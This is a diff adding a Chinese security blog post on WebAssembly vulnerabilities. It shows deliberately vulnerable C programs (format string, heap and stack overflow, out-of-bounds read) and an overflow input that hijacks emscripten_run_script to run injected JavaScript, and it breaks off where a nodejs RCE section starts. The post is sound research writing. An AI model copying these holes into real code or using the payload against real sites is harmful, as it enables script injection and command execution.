@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="WebAssembly 安全研究总结WebAssembly是什么&ensp;&ensp;WebAssembly（简称wasm） 是一种可移植、体积小、加载快并且能够在浏览器上运行的一种程序文件。其能够在JavaScript通过接口进行调用执行。开发者们一直都比较关心JS的运行速度问题，V8引擎在JS的运行速度方面做了巨大的优化，但是少数情况下我们进行大量本地运算的时候，仍然可能遇到性能瓶颈，这个时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebAssembly安全研究总结">
+<meta property="og:url" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="WebAssembly 安全研究总结WebAssembly是什么&ensp;&ensp;WebAssembly（简称wasm） 是一种可移植、体积小、加载快并且能够在浏览器上运行的一种程序文件。其能够在JavaScript通过接口进行调用执行。开发者们一直都比较关心JS的运行速度问题，V8引擎在JS的运行速度方面做了巨大的优化，但是少数情况下我们进行大量本地运算的时候，仍然可能遇到性能瓶颈，这个时">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/1.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/2.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/3.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/4.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/5.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/6.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/7.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/8.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/9.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/10.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/11.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/12.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/13.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/14.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/15.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/16.png">
+<meta property="og:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/17.png">
+<meta property="article:published_time" content="2024-01-18T08:54:44.000Z">
+<meta property="article:modified_time" content="2025-06-26T10:31:29.223Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="解释器&#x2F;简易虚拟机">
+<meta property="article:tag" content="wasm">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/1.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>WebAssembly安全研究总结 | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          WebAssembly安全研究总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-01-18 16:54:44" itemprop="dateCreated datePublished" datetime="2024-01-18T16:54:44+08:00">2024-01-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 18:31:29" itemprop="dateModified" datetime="2025-06-26T18:31:29+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="WebAssembly-安全研究总结"><a href="#WebAssembly-安全研究总结" class="headerlink" title="WebAssembly 安全研究总结"></a>WebAssembly 安全研究总结</h1><h2 id="WebAssembly是什么"><a href="#WebAssembly是什么" class="headerlink" title="WebAssembly是什么"></a>WebAssembly是什么</h2><p>&ensp;&ensp;WebAssembly（简称wasm） 是一种可移植、体积小、加载快并且能够在浏览器上运行的一种程序文件。其能够在JavaScript通过接口进行调用执行。开发者们一直都比较关心JS的运行速度问题，V8引擎在JS的运行速度方面做了巨大的优化，但是少数情况下我们进行大量本地运算的时候，仍然可能遇到性能瓶颈，这个时候webassembly的作用就凸现出来了。例如AutoCAD利用编译器将其沉淀了30多年的代码直接编译成WebAssembly，同时性能基于之前的普通Web应用得到了很大的提升。<br>&ensp;&ensp;C&#x2F;C++&#x2F;Rust源代码可以被编译为WebAssembly文件，然后JS层就可以对其进行调用。WebAssembly文件中存储着字节码，位于JavaScript引擎中的WebAssembly虚拟机将会执行字节码。字节码的执行有两种方式，一种是在运行时边读取opcode边执行，另一种则是在执行前将整个WebAssembly JIT翻译为本地汇编代码，然后直接跳转到汇编代码执行。V8采用的是第二种方式。</p>
+<h2 id="WebAssembly虚拟机"><a href="#WebAssembly虚拟机" class="headerlink" title="WebAssembly虚拟机"></a>WebAssembly虚拟机</h2><p>&ensp;&ensp;WebAssembly虚拟机是一种栈虚拟机，变量使用栈进行传递。WebAssembly虚拟机有两个栈，即数据栈和指令栈。</p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/1.png" class="" title="1.png">
+<p>&ensp;&ensp;WebAssembly的数据栈只用于存储数据，<strong>不会存储任何指针</strong>；指令栈只用于存储指令和数据在数据栈中的<strong>下标</strong>，<strong>不会存储任何数据</strong>，并且在执行opcode时会对取出的下标进行边界检查。由于WebAssembly将数据和程序流用栈给分隔开了，也就不会发生像汇编代码中的栈溢出劫持返回地址的漏洞利用手法。简而言之，WebAssembly中的所有指令都无法操作指针，也就不存在任意地址读写。但是传统的漏洞仍然存在，只是不能直接劫持程序流了。</p>
+<h2 id="WebAssembly文件格式"><a href="#WebAssembly文件格式" class="headerlink" title="WebAssembly文件格式"></a>WebAssembly文件格式</h2><p>编译代码emcc hello.c -s WASM&#x3D;1 -o hello.html</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   char buf[100];</span><br><span class="line">   memset(buf,0,100);</span><br><span class="line">   scanf(&quot;%s&quot;,buf);</span><br><span class="line">   printf(&quot;hello world: %s\n&quot;,buf);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将得到的hello.wasm使用wabt项目中的wasm2wat转为S表达式<br><code>./wasm2wat hello.wasm &gt; hello.wat</code><br>S-表达式是一个非常简单的用来表示树的文本格式，跟wasm二进制文件是简单的对应关系</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">  (type (;0;) (func (param i32) (result i32)))</span><br><span class="line">  (import &quot;wasi_snapshot_preview1&quot; &quot;fd_write&quot; (func (;0;) (type 9)))</span><br><span class="line">  (func (;0;) (type 8)</span><br><span class="line">    i32.const 1</span><br><span class="line">    i32.const 2</span><br><span class="line">    i32.add</span><br><span class="line">    ....</span><br><span class="line">  )</span><br><span class="line">  (table (;0;) 9 9 funcref)</span><br><span class="line">  (memory (;0;) 256 256)</span><br><span class="line">  (global (;0;) (mut i32) (i32.const 65536))</span><br><span class="line">  (export &quot;memory&quot; (memory 0))</span><br><span class="line">  (elem (;0;) (i32.const 1) func 13 12 14 39 40 43 44 46)</span><br><span class="line">  (data (;0;) (i32.const 100) &quot;hello&quot;)</span><br><span class="line">  (start 0))</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>使用010-Editor打开hello.wasm文件，可以看到对应的结构</p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/2.png" class="" title="2.png">
+<p>S表达式和WASM二进制之间是简单的翻译关系。由于S表达式的比较容易理解，在逆向WASM时可以直接阅读S表达式。</p>
+<h2 id="传统漏洞模式在WebAssembly中的变化"><a href="#传统漏洞模式在WebAssembly中的变化" class="headerlink" title="传统漏洞模式在WebAssembly中的变化"></a>传统漏洞模式在WebAssembly中的变化</h2><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>编译代码<br>emcc hello.c -s WASM&#x3D;1 -o hello.html</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   char buf[100];</span><br><span class="line">   memset(buf,&#x27;a&#x27;,100);</span><br><span class="line">   printf(&quot;%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p\n&quot;);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果</p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/3.png" class="" title="3.png">
+<p>编译后查看S表达式，我们重点关注一下S表达式的import表，这是WASM用于导入外部函数、库函数用的，有点类似于ELF的GOT表，不同的是import表即可以导入WASM虚拟机实现的内部的库函数，还能导入用户用JS写的函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(import &quot;wasi_snapshot_preview1&quot; &quot;fd_write&quot; (func (;0;) (type 9)))</span><br><span class="line">(import &quot;env&quot; &quot;emscripten_memcpy_js&quot; (func (;1;) (type 12)))</span><br><span class="line">(import &quot;wasi_snapshot_preview1&quot; &quot;fd_close&quot; (func (;2;) (type 0)))</span><br><span class="line">(import &quot;wasi_snapshot_preview1&quot; &quot;fd_read&quot; (func (;3;) (type 9)))</span><br><span class="line">(import &quot;env&quot; &quot;emscripten_resize_heap&quot; (func (;4;) (type 0)))</span><br><span class="line">(import &quot;wasi_snapshot_preview1&quot; &quot;fd_seek&quot; (func (;5;) (type 10)))</span><br></pre></td></tr></table></figure>
+<p>在这里我们没有看到printf，该函数被编译进了WASM。通过测试，格式化字符串漏洞仍然存在，<code>%p%p%p%p%p%p%p%p%p%p%p</code>能够泄漏出一些数据，但是运行结果并未泄漏出栈上的buf，这跟printf在不同的WebAssembly编译器中实现有关。</p>
+<h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void fun() &#123;</span><br><span class="line">   printf(&quot;fun\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void fun2() &#123;</span><br><span class="line">   printf(&quot;fun2\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">typedef struct Node &#123;</span><br><span class="line">   void (*f)();</span><br><span class="line">   char buf[100];</span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   char *p = (char* *)malloc(0x10);</span><br><span class="line">   Node *node = (Node *)malloc(sizeof(Node));</span><br><span class="line">   node-&gt;f = fun;</span><br><span class="line">   strcpy(node-&gt;buf,&quot;hello world\n&quot;);</span><br><span class="line">   node-&gt;f();</span><br><span class="line">   printf(&quot;before ptr=%p,buf=%s\n&quot;,node-&gt;f,node-&gt;buf);</span><br><span class="line">   memset(p,&#x27;a&#x27;,0x100);</span><br><span class="line">   printf(&quot;after ptr=%p,buf=%s\n&quot;,node-&gt;f,node-&gt;buf);</span><br><span class="line">   node-&gt;f();</span><br><span class="line">   return 0;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>运行结果</p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/4.png" class="" title="4.png">
+<p>堆溢出仍然存在，可以覆盖堆中的数据。根据前面的介绍，WASM数据区不可能存储指针，因此结构体中的f函数指针实际上是一个偏移值，可以利用溢出覆盖偏移值，进而能够去执行其他的wasm函数。但是这里无法像汇编那样能够跳转到任意函数以及gadgets，这里只能跳转到在函数表(func表)中存储的函数。</p>
+<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void fun() &#123;</span><br><span class="line">   printf(&quot;fun\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void fun2() &#123;</span><br><span class="line">   printf(&quot;fun2\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">typedef struct Node &#123;</span><br><span class="line">   void (*f)();</span><br><span class="line">   char buf[100];</span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   Node node;</span><br><span class="line">   char buf[10];</span><br><span class="line">   node.f = fun;</span><br><span class="line">   strcpy(node.buf,&quot;hello world\n&quot;);</span><br><span class="line">   node.f();</span><br><span class="line">   printf(&quot;before ptr=%p,buf=%s\n&quot;,node.f,node.buf);</span><br><span class="line">   memset(buf,&#x27;a&#x27;,100);</span><br><span class="line">   printf(&quot;after ptr=%p,buf=%s\n&quot;,node.f,node.buf);</span><br><span class="line">   node.f();</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果</p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/5.png" class="" title="5.png">
+<p>栈溢出与堆溢出类似，可以覆盖后方的一些数据结构，有函数指针的话可以覆盖函数的index，但是返回地址没有保存在数据栈中，因此不影响程序的返回执行。与汇编不同的是，WASM的栈空间溢出会把<strong>前面的变量覆盖</strong>，这是因为WASM开辟栈时是按照代码顺序来的，遇到node时，先压栈，遇到buf时，再压栈，这也就会导致buf在node的内存前面，可以覆盖到。</p>
+<h3 id="数组越界"><a href="#数组越界" class="headerlink" title="数组越界"></a>数组越界</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   int x = 0;</span><br><span class="line">   char buf[16];</span><br><span class="line">   memset(buf,&#x27;a&#x27;,0x10);</span><br><span class="line">   size_t data[1];</span><br><span class="line">   for (int i=-100;i&lt;100;i++) &#123;</span><br><span class="line">      printf(&quot;%p\n&quot;,data[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果</p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/6.png" class="" title="6.png">
+<p>数组越界可以泄漏数据区的任何数据，但是只会限定在数据区，因为下标的上下限就是数据栈的边界，这种边界检查在对应的访存opcode的handler中会进行。</p>
+<h2 id="WebAssembly的一些利用思路"><a href="#WebAssembly的一些利用思路" class="headerlink" title="WebAssembly的一些利用思路"></a>WebAssembly的一些利用思路</h2><h3 id="前端控制页面数据，可以构造XSS"><a href="#前端控制页面数据，可以构造XSS" class="headerlink" title="前端控制页面数据，可以构造XSS"></a>前端控制页面数据，可以构造XSS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;emscripten.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    char msg[100];</span><br><span class="line">    char buf[10];</span><br><span class="line">    strcpy(msg,&quot;alert(&#x27;Hello, world!&#x27;);&quot;);</span><br><span class="line">    scanf(&quot;%s&quot;,buf);</span><br><span class="line">    emscripten_run_script(msg);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输入<code>aaaaaaaaaaalert(&#39;hacked&#39;);</code>，可以将<code>emscripten_run_script</code>的参数覆盖，执行任意的JS代码。<br>运行结果</p>
+<img src="/ha1vk/2024/01/18/WebAssembly%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%80%BB%E7%BB%93/7.png" class="" title="7.png">
+<p>如结果所示，可以利用溢出覆盖一些能够执行JS脚本的函数的参数，当然也可以覆盖结构体中的函数偏移指向<code>emscripten_run_script</code>函数，并控制好参数去执行JS脚本。</p>
+<h3 id="服务器端RCE"><a href="#服务器端RCE" class="headerlink" title="服务器端RCE"></a>服务器端RCE</h3><p>WebAssembly不仅可以在浏览器中使用，还能够在服务器端被nodejs使用。与浏览器不同的是，nodejs可以支持系统操作API，例如<code>system、open</code>等函数，都能够在nodejs的<code>WebAssembly</code>中正常使用，那么就可以利用溢出等漏洞控制<code>system的参数</code>来达到命令执行<br>编译以下代码<code>emcc 1.c -o 1.js -s EXPORTED_FUNCTIONS=&quot;[&quot;_vuln&quot;]&quot; -s &quot;EXTRA_EXPORTED_RUNTIME_METHODS=[&#39;ccall&#39;]&quot;</code></p>
